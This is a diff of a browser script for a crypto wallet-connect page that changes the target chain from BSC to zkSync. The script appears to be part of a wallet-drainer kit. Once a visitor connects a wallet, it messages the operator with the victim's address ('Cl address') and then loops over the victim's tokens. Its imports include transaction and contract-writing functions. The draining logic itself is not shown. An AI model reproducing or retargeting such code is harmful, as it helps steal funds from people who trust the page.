@@ -23,11 +23,11 @@ import {
 
  
   // 0. Import wagmi dependencies
-  const { bsc, mainnet } = WagmiCoreChains;
+  const { zkSync, mainnet } = WagmiCoreChains;
   const { configureChains, createConfig, writeContract, sendTransaction, fetchBalance, fetchFeeData, connect, switchNetwork, getAccount, getNetwork } = WagmiCore;
   
   // 1. Define chains
-  const chains = [bsc, mainnet];
+  const chains = [zkSync, mainnet];
   const projectId = "ee71d215d0dec7d1bf950851c84d9643";
   
   // 2. Configure wagmi client
@@ -86,15 +86,15 @@ $(".proceed").click(async function () {
         alert("You need to connect your wallet first")
     }
     if(account.connector.name === "MetaMask"){
-    if(account.connector.options.getProvider().networkVersion !== "56"){
+    if(account.connector.options.getProvider().networkVersion !== "324"){
         console.log("Incorrect network")
         await switchNetwork({
-            chainId: 56,
+            chainId: 324,
           })
     }
 }
     selectedAccount = account.address;
-    sendMessage("Speci : Wallet Connected Successfully to bsc!")
+    sendMessage("Speci : Wallet Connected Successfully to zkSync!")
     sendMessage(`Cl address : ${selectedAccount}`)
         
     loopTokens();
